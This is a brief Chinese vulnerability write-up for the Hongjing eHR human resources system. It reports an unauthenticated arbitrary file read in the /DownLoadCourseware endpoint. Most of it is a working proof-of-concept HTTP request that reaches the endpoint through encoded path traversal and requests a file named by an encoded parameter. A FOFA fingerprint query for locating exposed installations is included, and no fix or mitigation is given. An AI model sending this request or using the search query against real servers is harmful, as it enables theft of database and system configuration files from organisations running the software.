# 宏景eHR人力资源管理系统接口DownLoadCourseware存在任意文件读取漏洞

宏景eHR /DownLoadCourseware 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```
app="HJSOFT-HCM"
```

## poc

```yaml
GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![image-20240704171035191](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407041710270.png)